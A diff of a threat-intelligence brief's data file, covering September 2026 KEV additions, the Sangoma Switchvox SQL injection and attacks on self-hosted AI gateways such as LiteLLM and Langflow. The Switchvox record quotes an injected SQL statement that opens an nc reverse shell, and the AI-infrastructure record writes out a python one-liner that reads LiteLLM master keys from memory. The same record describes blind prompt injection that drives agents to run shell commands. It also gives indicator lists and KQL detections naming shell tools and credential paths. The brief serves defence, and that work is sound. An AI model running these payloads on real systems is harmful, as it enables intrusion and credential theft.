-  "html": "<b>Self-hosted AI tooling has become an exploited attack surface, and the exploitation is aimed at secrets rather than the host.</b> VulnCheck reports CVE-2026-0768 (CVSS 9.8) being used against Langflow for environment variables, secret keys and SSH access, with 360-plus attempts on its UK canaries and more than 15,000 successful attacks across three other Langflow flaws; before 2026 only one Langflow CVE was known exploited, and eleven more have been added since. Set against OpenAI's declaration that its Astra model crossed a critical cyber capability threshold after finding zero-days, we assess with <b>moderate-to-high confidence</b> that AI platform hosts should be inventoried and credential-scoped as production identity assets, and that the discovery-to-exploitation window will keep compressing."
+  "html": "<b>Self-hosted AI tooling has become an exploited attack surface, and the exploitation is aimed at secrets rather than the host.</b> VulnCheck reports CVE-2026-0768 (CVSS 9.8) being used against Langflow for environment variables, secret keys and SSH access, with 360-plus attempts on its UK canaries and more than 15,000 successful attacks across three other Langflow flaws; before 2026 only one Langflow CVE was known exploited, and eleven more have been added since. Set against OpenAI's declaration that its Astra model crossed a critical cyber capability threshold after finding zero-days, Wiz's 90-day honeypot telemetry and a parallel Microsoft analysis now show the same surface being worked systematically — MCP command injection, blind prompt injection, and master keys read out of LiteLLM process memory rather than off disk — and we assess with <b>high confidence</b> that AI platform hosts should be inventoried and credential-scoped as production identity assets, and that the discovery-to-exploitation window will keep compressing."
  },
  {
   "num": "04",
@@ -952,9 +1073,98 @@ window.CTI = {
  {
   "num": "13",
   "html": "We assess with <b>high confidence</b> that Iran-linked activity against Western critical infrastructure has moved from access and reconnaissance to disruption. A small UK generator was taken offline for four days, and dozens of US wastewater plants across twelve states were disrupted with flooding and loss of water pressure, with CISA's Jul 30 advisory describing operator lockout and disconnected controllers. Researchers quoted in the reporting assess the UK case as a capability demonstration. The exposure is structural: reporting notes attackers found far more reachable PLCs in water than in power, where binding federal requirements apply, and that a volunteer defence programme had reached 21 of roughly 50,000 unprotected small utilities. Organisations with OT should verify that controller management paths are not internet-reachable and that manual-operation fallback is exercised, not assumed."
+ },
+ {
+  "num": "14",
+  "html": "<b>The Sep 2 KEV batch is the clearest signal yet that the exploited attack surface has moved into the build and AI chain.</b> Four of the seven additions — JFrog Artifactory, Starlette, Kestra OSS and LiteLLM — are components owned by engineering rather than by IT operations, and two of them (Starlette, LiteLLM) are dependencies that will not appear in an asset inventory under their own name. We assess with <b>high confidence</b> that organisations reconciling this batch against a CMDB will under-count their exposure, and that the reliable method is dependency and container inventory rather than asset lists; note also that the Kestra listing rests on a single Microsoft report of likely exploitation in late June, which is a lower evidentiary bar than the honeypot captures behind the other entries."
  }
 ],
   SOURCES: [
+ {
+  "group": "CISA KEV — seven additions, Sep 2, 2026",
+  "links": [
+   {
+    "label": "CISA — CISA Adds Seven Known Exploited Vulnerabilities to Catalog",
+    "url": "https://www.cisa.gov/news-events/alerts/2026/09/02/cisa-adds-seven-known-exploited-vulnerabilities-catalog"
+   },
+   {
+    "label": "CISA — Known Exploited Vulnerabilities Catalog",
+    "url": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
+   },
+   {
+    "label": "The Hacker News — CISA Adds Seven Exploited Flaws as Attackers Deploy Reverse Shells and Crypto Miners",
+    "url": "https://thehackernews.com/2026/09/cisa-adds-seven-exploited-flaws-as.html"
+   }
+  ]
+ },
+ {
+  "group": "Sangoma Switchvox — CVE-2026-9586",
+  "links": [
+   {
+    "label": "Horizon3.ai — CVE-2026-9586: Sangoma Switchvox RCE",
+    "url": "https://horizon3.ai/attack-research/disclosures/cve-2026-9586-sangoma-switchvox-rce/"
+   },
+   {
+    "label": "BleepingComputer — Hackers exploit Sangoma Switchvox flaw to deploy reverse shells",
+    "url": "https://www.bleepingcomputer.com/news/security/hackers-exploit-sangoma-switchvox-flaw-to-deploy-reverse-shells/"
+   },
+   {
+    "label": "Help Net Security — Exploitation of Sangoma Switchvox flaw is underway (CVE-2026-9586)",
+    "url": "https://www.helpnetsecurity.com/2026/09/02/exploitation-of-sangoma-switchvox-flaw-underway-cve-2026-9586/"
+   },
+   {
+    "label": "The Hacker News — Attackers Exploit Critical Switchvox Flaw to Deploy Reverse Shells Without Credentials",
+    "url": "https://thehackernews.com/2026/09/attackers-exploit-critical-switchvox.html"
+   }
+  ]
+ },
+ {
+  "group": "Self-hosted AI infrastructure — Wiz and Microsoft telemetry",
+  "links": [
+   {
+    "label": "Wiz Threat Research — Inside 90 days of attacks on AI infrastructure",
+    "url": "https://www.wiz.io/blog/ai-infrastructure-honeypot"
+   },
+   {
+    "label": "Microsoft Security Blog — When AI infrastructure becomes a target: securing gateways and control points",
+    "url": "https://www.microsoft.com/en-us/security/blog/2026/08/26/when-ai-infrastructure-becomes-target-securing-gateways-control-points/"
+   },
+   {
+    "label": "GHSA-7488-6r32-c95q — LiteLLM MCP authentication bypass (CVE-2026-59822)",
+    "url": "https://github.com/BerriAI/litellm/security/advisories/GHSA-7488-6r32-c95q"
+   },
+   {
+    "label": "GHSA-86qp-5c8j-p5mr — Starlette host header bypass (CVE-2026-48710)",
+    "url": "https://github.com/Kludex/starlette/security/advisories/GHSA-86qp-5c8j-p5mr"
+   },
+   {
+    "label": "GHSA-5vc5-wxxq-3fjx — Kestra OSS command injection (CVE-2026-49869)",
+    "url": "https://github.com/kestra-io/kestra/security/advisories/GHSA-5vc5-wxxq-3fjx"
+   }
+  ]
+ },
+ {
+  "group": "PaperCut NG/MF — post-compromise remote access tooling",
+  "links": [
+   {
+    "label": "Help Net Security — Attackers plant remote access tools on compromised PaperCut servers",
+    "url": "https://www.helpnetsecurity.com/2026/08/31/papercut-attack-remote-access-tools/"
+   },
+   {
+    "label": "SecurityWeek — PaperCut Exploitation Escalates to Active Intrusions",
+    "url": "https://www.securityweek.com/papercut-exploitation-escalates-to-active-intrusions/"
+   }
+  ]
+ },
+ {
+  "group": "Rockwell Automation and UK policy",
+  "links": [
+   {
+    "label": "Security Boulevard — Daily OT Security News: September 03, 2026",
+    "url": "https://securityboulevard.com/2026/09/daily-ot-security-news-september-03-2026/"
+   }
+  ]
+ },
  {
   "group": "SonicWall SMA1000 — CVE-2026-83548 / CVE-2026-83549 zero-days",
   "links": [
@@ -1421,6 +1631,30 @@ window.CTI = {
  }
 ],
   CORRECTIONS: [
+ {
+  "date": "Sep 3, 2026",
+  "item": "SonicWall SMA1000 — now KEV-listed",
+  "was": "CISA's KEV catalog held 17 SonicWall flaws as of Sep 2; neither CVE-2026-83548 nor CVE-2026-83549 had been added",
+  "now": "Both were added to KEV on Sep 2, 2026 in a seven-flaw batch, with a BOD 26-04 federal remediation deadline of Sep 5, 2026. Guidance is unchanged; the obligation is new"
+ },
+ {
+  "date": "Sep 3, 2026",
+  "item": "JFrog Artifactory CVE-2026-82329 — CVSS published and KEV-listed",
+  "was": "No CVSS score published in the sources reviewed, and not in KEV as of Sep 2",
+  "now": "CISA's Sep 2 KEV entry carries CVSS 9.8 and a federal deadline of Sep 5, 2026, and describes the flaw as improper authentication allowing an unauthenticated attacker with network access to obtain administrative privileges under default configuration. CVE-2026-66384 remains a separate KEV entry with a Sep 10 deadline"
+ },
+ {
+  "date": "Sep 3, 2026",
+  "item": "PaperCut — post-exploitation escalated to remote access tooling",
+  "was": "Huntress observed discovery-only activity: whoami, ver and tasklist, with no secondary malware, persistence or command-and-control",
+  "now": "PaperCut's Aug 30 bulletin extended the indicator list and described the actor enumerating users, privileges and processes before silently installing legitimate remote access software. Help Net Security reports SimpleHelp and AnyDesk on compromised Application Servers; watchTowr describes activity designed to enable internal network access. The earlier reconnaissance-only characterisation no longer holds"
+ },
+ {
+  "date": "Sep 3, 2026",
+  "item": "Posture statement — stale prune and carry-over lines removed",
+  "was": "The posture rows still stated that thirteen aged-out stories were dropped in the prune, and listed ownCloud CVE-2023-49105 among the items carried over",
+  "now": "Twenty-three stories were removed across the two prune passes on Sep 2, and ownCloud was one of the removals in the second pass. Both statements have been corrected"
+ },
  {
   "date": "Sep 2, 2026",
   "item": "Second prune pass — carried stories reduced to what is still live",
@@ -3041,6 +3275,300 @@ window.CTI = {
   ],
   "source": "SonicWall PSIRT advisory SNWLID-2026-0016, SecurityWeek",
   "sourceNote": "Sep 1–2, 2026"
+ },
+ "kevsep02": {
+  "eyebrow": "CISA KEV · Seven additions · Sep 2, 2026 · BOD 26-04",
+  "title": "Seven flaws added to KEV in one batch, four of them in AI and developer tooling",
+  "tags": [
+   [
+    "crit",
+    "All Sectors"
+   ],
+   [
+    "high",
+    "Federal deadlines Sep 5 and Sep 16, 2026"
+   ]
+  ],
+  "overview": "The Sep 2 batch is unusual in composition rather than size. Two entries are perimeter appliances (SonicWall SMA1000), one is a VoIP platform (Switchvox), and the remaining four sit in the software and AI build chain: JFrog Artifactory, Starlette, Kestra OSS and LiteLLM. Three of the four AI/dev entries are carried as full stories elsewhere in this brief; this record exists to hold the deadlines and the batch-level reading.",
+  "technical": [
+   "CVE-2026-83548 (CVSS 10.0) — SonicWall SMA1000 server-side request forgery; remote unauthenticated access to sensitive functionality. Federal deadline Sep 5, 2026.",
+   "CVE-2026-83549 (CVSS 7.8) — SonicWall SMA1000 post-authentication OS command injection reaching RCE as administrator. Federal deadline Sep 5, 2026.",
+   "CVE-2026-9586 (CVSS 9.3) — Sangoma Switchvox unauthenticated SQL injection; arbitrary SQL against the backend PostgreSQL database from a single crafted request, including RCE. Federal deadline Sep 5, 2026.",
+   "CVE-2026-82329 (CVSS 9.8) — JFrog Artifactory improper authentication; under default configuration an unauthenticated attacker with network access obtains administrative privileges. Federal deadline Sep 5, 2026.",
+   "CVE-2026-48710 (CVSS 6.5) — Kludex Starlette HTTP request/response smuggling; paths injected into the host part prepend the actual path, giving authentication bypass where authentication depends on the reconstructed URL path. Federal deadline Sep 16, 2026.",
+   "CVE-2026-49869 (CVSS 10.0) — Kestra OSS OS command injection; an unauthenticated remote attacker can create and execute arbitrary workflows without credentials. Federal deadline Sep 5, 2026.",
+   "CVE-2026-59822 (CVSS 8.8) — Berri LiteLLM MCP Streamable HTTP endpoint improper authentication; an unauthenticated attacker establishes an authenticated MCP session using an arbitrary Bearer token. Federal deadline Sep 16, 2026.",
+   "Microsoft's report is the stated basis for the Kestra listing: likely exploitation in late June 2026 to establish a reverse shell, conduct Docker container environment discovery, perform defence evasion, deploy a cryptocurrency miner and facilitate data harvesting. Microsoft describes four impact paths — shell execution through the workflow engine, container-environment exposure through Docker socket access, host resource hijacking through miner deployment, and follow-on collection through workflow task execution — and notes a later curl-pipe-shell event that encoded collected output and stored it through Kestra's own key-value interface, reducing reliance on standalone file artefacts.",
+   "Wiz reports exploitation of CVE-2026-59822 against its honeypots to probe model enumeration endpoints, and links Qilin ransomware actors to the CVE-2026-42271 plus CVE-2026-48710 chain."
+  ],
+  "iocs": [],
+  "iocNote": "No indicators accompany a KEV listing. Product-specific indicators for the entries in this batch are held in the SonicWall SMA1000 (none published), Sangoma Switchvox, JFrog Artifactory and AI infrastructure records in this brief.",
+  "mitigation": [
+   "Treat Sep 5, 2026 as the working deadline for SonicWall SMA1000, Switchvox, Artifactory and Kestra, and Sep 16 for Starlette and LiteLLM, whether or not you are an FCEB agency.",
+   "Starlette is a dependency, not a product: inventory it through the ASGI applications that ship it rather than by asset name. Update Starlette to 1.0.1 or later; LiteLLM to 1.83.7 or later.",
+   "Kestra OSS: take the workflow engine off the internet and remove Docker socket access from the engine container. An unauthenticated workflow-creation path with a mounted Docker socket is host compromise.",
+   "Where patching is not immediate on LiteLLM, block POST /mcp-rest/test/connection and POST /mcp-rest/test/tools/list at the reverse proxy or API gateway, restrict network access to trusted segments, and rotate credentials stored by the proxy."
+  ],
+  "response": [
+   "This is a catalog and deadline record. Hunting queries for the individual products in the batch live in the Sangoma Switchvox, JFrog Artifactory, PaperCut and AI infrastructure records rather than being duplicated here.",
+   "Reconcile the batch against your own exposure inventory before the Sep 5 deadline rather than against asset criticality tiers — three of these products (Starlette, Kestra, LiteLLM) are typically owned by engineering rather than by IT operations and often sit outside the CMDB."
+  ],
+  "source": "CISA KEV catalog (Sep 2, 2026), The Hacker News, Microsoft Security Blog, Wiz Threat Research",
+  "sourceNote": "Sep 2–3, 2026"
+ },
+ "switchvox": {
+  "eyebrow": "Sangoma Switchvox · CVE-2026-9586 · CVSS 9.3 · Exploited from Aug 30, 2026",
+  "title": "Unauthenticated SQL injection on /pa gives PostgreSQL superuser RCE; reverse shells observed from a single source IP",
+  "tags": [
+   [
+    "crit",
+    "Communications"
+   ],
+   [
+    "high",
+    "Patched Jul 14, exploited Aug 30"
+   ]
+  ],
+  "overview": "A six-week gap between the patch and first observed exploitation, caught by honeypots deployed before the fix shipped. The vulnerability is a textbook unparameterised concatenation into a PostgreSQL query on an endpoint that was never meant to be authenticated, and PostgreSQL's COPY ... TO PROGRAM converts SQL execution into command execution directly. Horizon3's assessment is that most internet-exposed Switchvox systems have either already been targeted or will be.",
+  "technical": [
+   "Affected: Sangoma Switchvox SMB Edition 8.3 (build 104997) and earlier. Fixed in Switchvox 8.4.0.2, released Jul 14, 2026.",
+   "The /pa endpoint, handled by PhoneAppsHandler.pm, is exposed without authentication and parses XML beginning with <PolycomIPPhone>. The user-controlled PhoneIP field is concatenated directly into a PostgreSQL query with no sanitisation or parameterisation.",
+   "Horizon3 published an example of the injected statement recorded in the appliance log: SELECT proposed_extension FROM auto_phone_config WHERE ip_address = '10.0.0.1'; COPY (SELECT '') TO PROGRAM 'nc 10.0.18.42 4444 -e /bin/bash > /tmp/0d012120ab00297d.txt 2>&1; chmod 644 /tmp/0d012120ab00297d.txt'--' AND config_state = 'configured'. The 10.0.18.42 address in that excerpt is Horizon3's own test listener, not an attacker asset.",
+   "Timeline: Apr 10, 2026 — Horizon3 reports 12 distinct Switchvox vulnerabilities to Sangoma. May 8 — Horizon3 and Defused Cyber deploy internet honeypots mimicking Switchvox, before fixes exist. May 11 — SRA independently reports issues. Jul 14 — Sangoma releases 8.4.0.2. Aug 30 — the honeypot tripwire fires.",
+   "Observed activity: exploitation attempts from a single IP address, dropping a reverse shell and then running Base64-encoded commands to enumerate running processes. Help Net Security reports later second-stage malware deployment, possibly a cryptominer.",
+   "SRA Labs demonstrated a further impact path: exfiltration of the cookie signing key to an external server, which allows an attacker to forge authentication material for arbitrary users. Rotating that key is therefore part of recovery, not optional hardening.",
+   "Horizon3 says it has not observed exploitation of the other 11 reported flaws. Zach Hanley noted that with LLM-assisted vulnerability discovery, duplicate findings are expected to become the norm, making visibility into when a finding becomes known and exploited more valuable.",
+   "Added to CISA KEV on Sep 2, 2026 with a federal remediation deadline of Sep 5, 2026."
+  ],
+  "iocs": [
+   {
+    "type": "IP",
+    "value": "176.65.148.184",
+    "note": "Sole observed exploitation source against the Horizon3/Defused Cyber Switchvox honeypots from Aug 30, 2026"
+   },
+   {
+    "type": "Behavior",
+    "value": "Outbound connection from a Switchvox appliance on TCP/39323",
+    "note": "Reverse-shell callback port reported by BleepingComputer alongside the attacker IP"
+   },
+   {
+    "type": "Filename",
+    "value": "/var/log/switchvox/db-quirks.log",
+    "note": "On devices with SSH access enabled, the SQL injection payload is recorded here; review for injected statements"
+   },
+   {
+    "type": "String",
+    "value": "COPY (SELECT '') TO PROGRAM",
+    "note": "PostgreSQL construct in the injected statement that converts SQL execution into command execution; search db-quirks.log for it"
+   },
+   {
+    "type": "String",
+    "value": "<PolycomIPPhone>",
+    "note": "XML prefix parsed by the /pa endpoint; unexpected /pa requests carrying it from untrusted sources are the exploitation attempt"
+   }
+  ],
+  "iocNote": "Horizon3 published a small, high-confidence indicator set: one attacker IP, one log file, and the payload shape. No hashes were published, so no SHA256 is available for the second-stage binary. The /tmp/0d012120ab00297d.txt filename in Horizon3's excerpt is from their own test payload and should not be treated as an attacker artefact.",
+  "mitigation": [
+   "Upgrade to Switchvox 8.4.0.2 or later. If that cannot be done immediately, restrict network access to the Switchvox web interfaces and specifically to the /pa endpoint.",
+   "Take Switchvox management off the public internet. Horizon3's position is that exposed instances have been or will be targeted.",
+   "Review /var/log/switchvox/db-quirks.log for injected SQL, and firewall and proxy logs for 176.65.148.184 and for outbound connections on TCP/39323.",
+   "If compromise is suspected, rotate the cookie signing key — SRA Labs showed it can be exfiltrated, and it lets an attacker forge authentication material for arbitrary users. Rebuild the appliance rather than cleaning it; a PostgreSQL superuser shell is full control of the host.",
+   "Check for cryptominer processes and unexpected outbound mining-pool traffic; second-stage staging has been reported."
+  ],
+  "response": [
+   "DEFENDER XDR KQL — outbound contact with the published attacker IP and the reverse-shell port from any device, which is the one signal available where the appliance itself sends no telemetry.\n\n// Switchvox CVE-2026-9586 — attacker infrastructure and reverse-shell callback\n// IPTags enrichment pattern adapted from community work: github.com/Bert-JanP/Hunting-Queries-Detection-Rules (Bert-Jan Pals, kqlquery.com)\nlet switchvoxIPs = dynamic([\"176.65.148.184\"]);\nDeviceNetworkEvents\n| where Timestamp > ago(30d)\n| where RemoteIP in (switchvoxIPs) or LocalIP in (switchvoxIPs) or RemotePort == 39323\n| project Timestamp, DeviceName, ActionType, LocalIP, RemoteIP, RemotePort, InitiatingProcessFileName, InitiatingProcessCommandLine\n| sort by Timestamp desc",
+   "SENTINEL KQL — the same indicators across network and firewall connectors, written with union isfuzzy so it still runs where a connector is absent.\n\n// Switchvox CVE-2026-9586 — perimeter view of exploitation and callback\nlet lookback = 30d;\nlet switchvoxIPs = dynamic([\"176.65.148.184\"]);\nlet callbackPort = 39323;\nunion isfuzzy=true\n  (CommonSecurityLog\n   | where TimeGenerated > ago(lookback)\n   | where SourceIP in (switchvoxIPs) or DestinationIP in (switchvoxIPs) or DestinationPort == callbackPort\n   | project TimeGenerated, Source = \"CommonSecurityLog\", Src = SourceIP, Dst = DestinationIP, Port = DestinationPort, Extra = RequestURL),\n  (AzureDiagnostics\n   | where TimeGenerated > ago(lookback)\n   | where Category has \"Firewall\"\n   | where msg_s has_any (switchvoxIPs) or msg_s has tostring(callbackPort)\n   | project TimeGenerated, Source = \"AzureDiagnostics\", Src = \"\", Dst = \"\", Port = callbackPort, Extra = msg_s),\n  (DeviceNetworkEvents\n   | where Timestamp > ago(lookback)\n   | where RemoteIP in (switchvoxIPs) or RemotePort == callbackPort\n   | project TimeGenerated = Timestamp, Source = \"DeviceNetworkEvents\", Src = LocalIP, Dst = RemoteIP, Port = RemotePort, Extra = InitiatingProcessCommandLine)\n| sort by TimeGenerated desc",
+   "SENTINEL KQL — appliance log review where Switchvox syslog is forwarded, looking for the injection shape rather than a fixed payload.\n\n// Switchvox CVE-2026-9586 — injected SQL in db-quirks.log\nSyslog\n| where TimeGenerated > ago(30d)\n| where SyslogMessage has_any (\"db-quirks\", \"auto_phone_config\")\n| where SyslogMessage has_any (\"TO PROGRAM\", \"COPY (SELECT\", \"pg_read_file\", \"COPY (SELECT '')\")\n| project TimeGenerated, Computer, Facility, SeverityLevel, SyslogMessage\n| sort by TimeGenerated desc",
+   "Where Switchvox logs are not centralised, pull /var/log/switchvox/db-quirks.log off each appliance by hand before rebuilding. The log is the only place the payload is recorded."
+  ],
+  "source": "Horizon3.ai (Zach Hanley) disclosure, Defused Cyber, SRA Labs, BleepingComputer, Help Net Security, The Hacker News, CISA KEV",
+  "sourceNote": "Sep 1–3, 2026"
+ },
+ "aiinfra": {
+  "eyebrow": "Self-hosted AI infrastructure · Wiz 90-day honeypot telemetry · Microsoft AI gateway report",
+  "title": "MCP command injection, blind prompt injection and credentials read out of process memory",
+  "tags": [
+   [
+    "crit",
+    "Information Technology"
+   ],
+   [
+    "high",
+    "Credential theft · Cryptomining · Qilin link"
+   ]
+  ],
+  "overview": "Two independent bodies of telemetry, published a day apart, describe the same shift: attackers now treat AI gateways and agent frameworks as credential concentrators rather than as web apps. Wiz's framing is that a LiteLLM proxy can hold keys for every model provider it routes to, may run with cloud IAM permissions, and connects to internal services through MCP tool servers, so one compromise reaches everything downstream. The tooling observed is adapted to each product's internals — this is not commodity scanning.",
+  "technical": [
+   "Pattern 1, MCP exploitation. CVE-2026-59822 (Wiz-discovered) sits in LiteLLM's OAuth2 header handling: when token validation fails the server returns an empty UserAPIKeyAuth() object with no restrictions rather than rejecting the request. Any Bearer token, including a single character, grants full MCP access. Observed requests: GET /v1/models with Authorization: Bearer x.",
+   "CVE-2026-42271 passes the command field of an MCP server test configuration directly to subprocess execution with no allowlist or admin gate. Attackers submitted a fake stdio server config whose command was a Python script that fetched a zip from an attacker host, extracted a miner to /tmp/.dbus-cache/, launched it with start_new_session=True, then removed the staging directory with rmtree while the running process kept the binary's inode open — and returned a valid MCP handshake so the connection test appeared to succeed. Command output was returned through the MCP protocol itself, embedded in the description field of a fake tool in the tools/list response.",
+   "Chaining: CVE-2026-42271 with the Starlette host-header bypass CVE-2026-48710 gives fully unauthenticated RCE. Wiz states that external researchers have linked the Qilin ransomware group to active exploitation of this chain.",
+   "Pattern 2, blind prompt injection against LangChain, Flowise, OpenWebUI and Node-RED. Injected prompts instruct the agent to run an OS command; if the agent has a shell tool, a DNS query fires to an attacker-controlled OAST callback domain with the victim IP encoded in the subdomain and a per-session random string, confirming execution without surfacing output. Wiz notes the natural-language prompt itself was not captured and the example it publishes is a reconstruction consistent with the observed process tree, not a captured payload. Payloads are then fetched from Pastebin rather than sent inline, Base64-encoded to defeat prompt-level filtering, ending in XMRig at /usr/src/node-red/xmrig — a path chosen to blend into the Node.js process tree.",
+   "Pattern 3, AI-native post-exploitation. On LiteLLM the master key does not exist on disk, so attackers queried the running Python module state directly: python3 -c \"import litellm; print(getattr(litellm,'api_key',None)); import litellm.proxy.proxy_server as ps; print(getattr(ps,'master_key',None)); print(getattr(ps,'litellm_master_key_hash',None))\". The same sessions enumerated /app/litellm_config.yaml, /etc/litellm/.env and ~/.litellm/config.yaml.",
+   "Backend fingerprinting: on instances still running the default master key sk-1234, attackers posted to /chat/completions asking the model to output only its own name, to decide between stealing the key, abusing inference quota (LLMjacking) or moving on.",
+   "Camouflage: on the Langflow honeypot the miner was staged at /app/data/.claude/ and renamed unicorn — a directory that blends in because Claude Code writes it on any host where it runs.",
+   "Microsoft's parallel report describes LiteLLM gateways broken into via CVE-2026-42271 and CVE-2026-48710 to deliver an XMRig miner as an ELF binary, after fingerprinting the host and terminating competing mining processes. The attackers then reused collected database information to reach the LiteLLM-backed PostgreSQL tier and query LiteLLM_ProxyModelTable and LiteLLM_VerificationToken for model configuration, upstream provider key material, provider endpoints and proxy-issued virtual keys. Persistence is through ~/.ssh/authorized_keys modification.",
+   "Microsoft additionally suspects exploitation of exposed RAGFlow instances via CVE-2026-45312, CVE-2026-28797, CVE-2026-24770, CVE-2025-68700 and CVE-2025-69286 to establish persistence and steal LLM provider keys and related metadata. Its conclusion: monitor AI workloads according to their control-plane role, not only as isolated applications.",
+   "Scale context from Wiz's State of AI in the Cloud 2026: 90% of cloud environments run self-hosted AI software, 81% run managed AI services, 63% self-host models. Wiz also notes most AI tools ship unauthenticated — Marimo, Flowise, Langflow, Ollama, ChromaDB, Milvus among them."
+  ],
+  "iocs": [
+   {
+    "type": "IP",
+    "value": "185.62.1[.]8",
+    "note": "Malware download server, LiteLLM/MCP campaign (Wiz)"
+   },
+   {
+    "type": "IP",
+    "value": "185.84.98[.]85",
+    "note": "Cryptominer command and control (Wiz)"
+   },
+   {
+    "type": "IP",
+    "value": "94.26.106[.]29",
+    "note": "Langflow binary staging (Wiz)"
+   },
+   {
+    "type": "Domain",
+    "value": "pool.hashvault[.]pro",
+    "note": "Monero mining pool used across multiple campaigns (Wiz)"
+   },
+   {
+    "type": "Domain",
+    "value": "crazyeltonproxy[.]top",
+    "note": "Monero mining proxy, LangChain and Node-RED campaigns (Wiz)"
+   },
+   {
+    "type": "Domain",
+    "value": "1710.rwlp.be",
+    "note": "Compromised WordPress site used for binary staging (Wiz)"
+   },
+   {
+    "type": "URL",
+    "value": "hxxp://185.62.1[.]8/mon/mon.zip",
+    "note": "Miner archive retrieved by the injected MCP test-configuration command (Wiz)"
+   },
+   {
+    "type": "Filename",
+    "value": "/tmp/.dbus-cache/gmon",
+    "note": "Monero miner binary; staging directory /tmp/.dbus-cache/ is deleted after launch while the process holds the inode (Wiz)"
+   },
+   {
+    "type": "Filename",
+    "value": "/tmp/x86_64, /tmp/amd64",
+    "note": "Langflow dropper, self-deleting (Wiz)"
+   },
+   {
+    "type": "Filename",
+    "value": "/usr/src/node-red/xmrig",
+    "note": "XMRig staged inside the Node-RED tree after blind prompt injection (Wiz)"
+   },
+   {
+    "type": "Filename",
+    "value": "/app/data/.claude/unicorn",
+    "note": "Miner renamed and hidden in a Claude Code config directory on the Langflow honeypot (Wiz)"
+   },
+   {
+    "type": "Behavior",
+    "value": "Authorization: Bearer x on /v1/models",
+    "note": "Single-character Bearer token exploiting CVE-2026-59822 to probe model enumeration endpoints (Wiz)"
+   },
+   {
+    "type": "Behavior",
+    "value": "python3 reading litellm.proxy.proxy_server master_key from module state",
+    "note": "Memory-resident master-key theft; no file artefact is produced (Wiz)"
+   },
+   {
+    "type": "Behavior",
+    "value": "SELECT against LiteLLM_ProxyModelTable / LiteLLM_VerificationToken",
+    "note": "Provider key material and proxy-issued virtual keys harvested from the LiteLLM PostgreSQL tier (Microsoft)"
+   },
+   {
+    "type": "String",
+    "value": "sk-1234",
+    "note": "LiteLLM default master key; attackers test for it before deciding whether to steal keys or abuse inference quota (Wiz)"
+   }
+  ],
+  "iocNote": "Wiz published a network and file indicator table; Microsoft published behaviour and table names rather than hashes. No SHA256 values for the gmon, unicorn or XMRig binaries appear in either write-up, so none are recorded here. Defanging follows the sources. Note that /tmp/.dbus-cache/ is removed immediately after launch, so a disk sweep after the fact will not find it — the process listing and open file handles will.",
+  "mitigation": [
+   "Update LiteLLM to 1.83.7 or later and Starlette to 1.0.1 or later. Where patching is not immediate, block POST /mcp-rest/test/connection and POST /mcp-rest/test/tools/list at the reverse proxy or API gateway.",
+   "Rotate every credential the proxy could reach — provider API keys, the master key, proxy-issued virtual keys — not just the master key. Memory-resident theft leaves no file artefact to tell you what was taken.",
+   "Change any instance still running the default master key sk-1234 immediately; it is a fingerprinting target in its own right.",
+   "Inventory the AI stack as production infrastructure with owners and monitoring. Wiz's position is that 'unauthenticated on the internet' should be treated as 'compromised' for Marimo, Flowise, Langflow, Ollama, ChromaDB and Milvus.",
+   "Restrict lateral reach: scope IAM permissions on AI proxies narrowly, block outbound egress where possible, and harden every MCP-connected service as though it were internet-facing, because it is inside the blast radius of any proxy compromise.",
+   "Deny agents a shell tool unless there is a specific need. Blind prompt injection only reaches command execution when the agent has one.",
+   "Remove Docker socket access from workflow and agent containers, and check ~/.ssh/authorized_keys on every AI host for keys you did not add."
+  ],
+  "response": [
+   "DEFENDER XDR KQL — process ancestry is the control Wiz recommends: an AI server spawning a shell catches exploitation regardless of entry vector.\n\n// AI infrastructure — AI service process spawning a shell or interpreter\n// Process-ancestry technique adapted from community work: github.com/SlimKQL/Hunting-Queries-Detection-Rules (Steven Lim, @0x534c)\nlet aiParents = dynamic([\"python3\",\"python\",\"uvicorn\",\"gunicorn\",\"node\",\"litellm\",\"ollama\",\"langflow\",\"flowise\"]);\nDeviceProcessEvents\n| where Timestamp > ago(30d)\n| where InitiatingProcessFileName has_any (aiParents)\n| where FileName in~ (\"sh\",\"bash\",\"dash\",\"curl\",\"wget\",\"nc\",\"ncat\",\"chmod\",\"base64\")\n| where ProcessCommandLine has_any (\"base64 -d\",\"| bash\",\"curl \",\"wget \",\"chmod 777\",\"chmod 755\",\"start_new_session\")\n| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine\n| sort by Timestamp desc",
+   "DEFENDER XDR KQL — the specific post-exploitation tradecraft: master-key extraction from module state, config enumeration and the staging paths.\n\n// AI infrastructure — LiteLLM credential theft and miner staging\nlet credPatterns = dynamic([\"litellm.proxy.proxy_server\",\"litellm_master_key_hash\",\"master_key\",\"/app/litellm_config.yaml\",\"/etc/litellm/.env\",\"/.litellm/config.yaml\",\"sk-1234\"]);\nlet stagePaths = dynamic([\"/tmp/.dbus-cache\",\"/usr/src/node-red/xmrig\",\"/app/data/.claude\",\"/tmp/x86_64\",\"/tmp/amd64\"]);\nunion isfuzzy=true\n  (DeviceProcessEvents\n   | where Timestamp > ago(30d)\n   | where ProcessCommandLine has_any (credPatterns) or ProcessCommandLine has_any (stagePaths)\n   | project Timestamp, DeviceName, AccountName, Signal = \"process\", Evidence = ProcessCommandLine),\n  (DeviceFileEvents\n   | where Timestamp > ago(30d)\n   | where FolderPath has_any (stagePaths) or FileName in~ (\"gmon\",\"unicorn\",\"xmrig\")\n   | project Timestamp, DeviceName, AccountName = InitiatingProcessAccountName, Signal = \"file\", Evidence = strcat(FolderPath, \" | \", FileName)),\n  (DeviceFileEvents\n   | where Timestamp > ago(30d)\n   | where FileName =~ \"authorized_keys\"\n   | where InitiatingProcessFileName has_any (dynamic([\"python3\",\"python\",\"sh\",\"bash\",\"node\"]))\n   | project Timestamp, DeviceName, AccountName = InitiatingProcessAccountName, Signal = \"ssh-persistence\", Evidence = strcat(FolderPath, \" modified by \", InitiatingProcessFileName))\n| sort by Timestamp desc",
